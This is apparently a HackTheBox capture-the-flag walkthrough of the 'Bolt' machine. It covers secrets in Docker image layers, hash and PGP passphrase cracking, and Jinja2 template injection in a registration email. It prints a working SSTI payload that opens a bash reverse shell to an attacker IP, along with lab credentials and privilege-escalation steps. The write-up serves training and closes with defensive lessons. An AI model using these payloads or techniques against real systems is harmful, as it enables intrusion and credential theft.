---
title: "Bolt"
date: 2022-01-08
type: docs
tags:
  - htb
  - linux
  - medium
  - docker-image
  - image-layer-analysis
  - sqlite
  - john
  - ssti
  - jinja2
  - email-template-injection
  - password-reuse
  - passbolt
  - gpg
  - pgp
---

<div class="callout callout-info">

**Box Info**

**Platform:** HackTheBox, **OS:** Linux (Ubuntu 20.04), **Difficulty:** Medium, **Released:** 2022-01-08, **IP:** `10.10.11.114` , `bolt.htb`

</div>

<div class="callout callout-abstract">

**Attack Path**

1. `bolt.htb` plus vhosts `passbolt.bolt.htb` (**Passbolt** 3.2.1), `demo.bolt.htb` (an AppSeed Flask portal), `mail.bolt.htb` (Roundcube).
2. `demo.bolt.htb/download` serves a **Docker image** (`image.tar`). Extract the layers and you get: DB creds in `passbolt.php` (`passbolt : rT2;jW7<eY8!dX8}pQ8%`), `db.sqlite3` with the admin hash (crack to `deadbolt`), a hardcoded registration invite code `XNSS-HSJW-3NGU-8XTJ` in `routes.py`, and **eddie's PGP private key** in his Chrome extension storage.
3. Register on `demo.bolt.htb` with the invite code. The profile **name** field is **Jinja2 SSTI**, rendered into the confirmation email. A payload there executes on the server. Shell as `www-data`.
4. `www-data` to **`eddie`**: the DB password is reused for his system account. `su eddie` (SSH also works).
5. `eddie` to root: `mysql` into `passboltdb`, pull the armored secret from the `secrets` table, import eddie's PGP key (passphrase cracked with `gpg2john`), decrypt the secret. It is a JSON blob containing **root's password**. `su`.

</div>

<div class="callout callout-key">

**Credentials and Flags**


| Where | Value |
| --- | --- |
| `passbolt.php` (DB), reused for `eddie` | `rT2;jW7<eY8!dX8}pQ8%` |
| `db.sqlite3` admin (md5crypt, cracked) | `deadbolt` |
| invite code (`routes.py`) | `XNSS-HSJW-3NGU-8XTJ` |
| eddie PGP passphrase | `merrychristmas` |
| `user.txt` | `/home/eddie/user.txt` |
| `root.txt` | `/root/root.txt` |

</div>

---

## Overview

Bolt is a **Docker image analysis** box. The entire foothold is in the layers of `image.tar`: config files with a live DB password, a SQLite database with a crackable admin hash, a hardcoded invite code, and, buried in a Chrome extension's LevelDB log, a user's exported PGP private key. Then a **Jinja2 SSTI in an email template** (your profile name is interpolated into the confirmation mail without escaping), **password reuse**, and finally the interesting root: **Passbolt stores every secret encrypted to each user's PGP key**, and root's password is a shared secret encrypted to eddie, so with eddie's private key and passphrase you decrypt it straight out of the database.

Related "unpack a container image for secrets": this is the reference case, see also [MonitorsTwo](/writeups/hackthebox/linux/easy/monitorstwo/) for reading the DB from inside a container. Related SSTI: [Perfection](/writeups/hackthebox/linux/easy/perfection/), [Rabbit Store](/writeups/tryhackme/linux/medium/rabbit-store/), [Theseus](/writeups/tryhackme/linux/insane/theseus/). Related GPG keyvault to credentials: [Environment](/writeups/hackthebox/linux/medium/environment/).

---

## Full Walkthrough

### Recon

```console
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3
80/tcp  open  http     nginx 1.18.0 (Ubuntu)   (Django starter site)
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)   (cert CN = passbolt.bolt.htb)
```

The 443 cert gives away `passbolt.bolt.htb`. Chasing subdomains and links (and a 404 page that references `https://passbolt.bolt.htb/`):

- `passbolt.bolt.htb` , **Passbolt** password manager, version 3.2.1 (from the footer)
- `demo.bolt.htb` , an AppSeed "Datta Able" Flask portal with login and a `/download` page
- `mail.bolt.htb` , Roundcube webmail

### The Docker image

`demo.bolt.htb/download` (or `passbolt.bolt.htb/uploads/image.tar`, fetched with `curl` since the browser 404s it) serves a Docker image tarball.

```bash
mkdir img && tar xf image.tar -C img
cd img
# each layer is <hash>/layer.tar ; extract them in order, or:
for l in */layer.tar; do tar xf "$l" -C extracted/ 2>/dev/null; done
```

<div class="callout callout-note">

**What a Docker `save` tarball contains**

`docker save` produces a tar of `manifest.json`, one directory per **layer** (`<hash>/layer.tar`), and the image config JSON. Each layer is a filesystem diff, so extracting them in the manifest order rebuilds the container's `/`. Everything the build ever added is there, including files that a later layer "deleted" (they become `.wh.` whiteout entries but the data is still in the earlier layer). Tools: `dive`, `docker load` then `docker export`, or just `tar` each layer.

</div>

From the extracted filesystem:

```python
# app/config.py  and  passbolt.php
$dbUsername = 'passbolt';
$dbPassword = 'rT2;jW7<eY8!dX8}pQ8%';
$dbDatabase = 'passboltdb';
```

```python
# app/base/routes.py
INVITE_CODES = ['XNSS-HSJW-3NGU-8XTJ']
```

A layer also contains `db.sqlite3`:

```console
$ sqlite3 db.sqlite3 'select username, password from User'
admin|$1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.
```

```console
$ john --wordlist=rockyou.txt admin.hash
deadbolt         (admin)
```

And, in eddie's Chrome profile inside the image:

```
.config/google-chrome/Default/Local Extension Settings/didegimhafipceonhjepacocaffmoppf/000003.log
```

which contains eddie's **PGP private key** (the Passbolt browser extension stores it there). Extract the armored key block, then:

```bash
gpg2john eddie_priv.asc > pgp.hash
john --wordlist=rockyou.txt pgp.hash        # -> merrychristmas
```

### Foothold, Jinja2 SSTI in the confirmation email

With the invite code and a stack of credentials pulled out of the image, I turn back to `demo.bolt.htb`'s registration flow, since a gated signup process is a strong signal that something interesting happens once you're actually a user rather than an anonymous visitor.

<div class="callout callout-note">

**SSTI in an email template**

Register on `demo.bolt.htb` using the invite code `XNSS-HSJW-3NGU-8XTJ`. Set your profile **name** to a Jinja2 payload. When the app sends the account confirmation email it renders `Hello {{ name }}` server side without autoescaping, so the payload executes. Read the mail in Roundcube (`mail.bolt.htb`, log in as the account you registered) to see the output, then swap in a shell:
```
name = {{ cycler.__init__.__globals__.os.popen('id').read() }}
# then:
name = {{ config.__class__.__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/10.10.14.5/9001 0>&1"').read() }}
```
Trigger a new email (re-send confirmation / update profile). Shell as `www-data`.

</div>

### www-data to eddie

Landing on `www-data`, the DB password I pulled from the Docker layers earlier is the first thing I try against every named account I've seen, since password reuse between an app's DB config and a real login is close to a house style on these boxes.

```bash
su eddie        # rT2;jW7<eY8!dX8}pQ8%   (DB password reused)
# or: ssh eddie@bolt.htb
cat /home/eddie/user.txt
```

### Privilege Escalation, decrypt root's password from Passbolt

<div class="callout callout-note">

**Passbolt secret storage**

Passbolt is end to end encrypted: every "password" (secret) is stored in the `secrets` table as an **OpenPGP message encrypted to that user's public key**. The server never has plaintext. So if you have a user's *private* key and passphrase (we do, from the Docker image), you can decrypt any secret that was shared with them. Root's password is stored as a secret shared with eddie.

</div>

```bash
# on the box as eddie
mysql -u passbolt -p'rT2;jW7<eY8!dX8}pQ8%' passboltdb -e 'select data from secrets;'
# copy the -----BEGIN PGP MESSAGE----- block

gpg --import eddie_priv.asc                 # passphrase: merrychristmas
gpg -d secret.asc
# {"password":"<root password>","description":""}

su                                          # <root password>
cat /root/root.txt
```

---

## Loot

| Flag | Location |
| --- | --- |
| `user.txt` | `/home/eddie/user.txt` |
| `root.txt` | `/root/root.txt` |

---

## Lessons and Takeaways

- **Do not publish Docker images.** They carry every build time secret, including files a later layer "removed". Use multi stage builds and a secrets manager, and scan images with `trufflehog` / `dive`.
- **Autoescape templates**, and never render user input as a template. Jinja2 SSTI in an email is still RCE.
- **Unique passwords.** The DB password unlocking `eddie` is the same anti pattern as always.
- **Crack protect PGP keys** with a strong passphrase. `merrychristmas` fell to rockyou instantly, which unravelled the whole vault.
- **Passbolt's model is only as strong as the users' key hygiene.** A leaked private key exposes everything shared with that user.

---

## Related Writeups

- **Container image / layer analysis for secrets:** [MonitorsTwo](/writeups/hackthebox/linux/easy/monitorstwo/)
- **SSTI (Jinja2 / ERB):** [Perfection](/writeups/hackthebox/linux/easy/perfection/), [Rabbit Store](/writeups/tryhackme/linux/medium/rabbit-store/), [Theseus](/writeups/tryhackme/linux/insane/theseus/), [Luanne](/writeups/hackthebox/bsd/medium/luanne/)
- **GPG / PGP keyvault to credentials:** [Environment](/writeups/hackthebox/linux/medium/environment/)
- **Password reuse to a system user then root:** [Cat](/writeups/hackthebox/linux/medium/cat/), [Nocturnal](/writeups/hackthebox/linux/easy/nocturnal/), [TwoMillion](/writeups/hackthebox/linux/easy/twomillion/)

## References

- HTB Bolt (pencer.io) <https://pencer.io/ctf/ctf-htb-bolt/>
- HTB Bolt (fdlucifer) <https://fdlucifer.github.io/2021/09/29/bolt/>
- PayloadsAllTheThings SSTI (Jinja2) <https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection>
- dive (image explorer) <https://github.com/wagoodman/dive>
- Final privilege escalation steps cross-referenced against public writeups for this box.
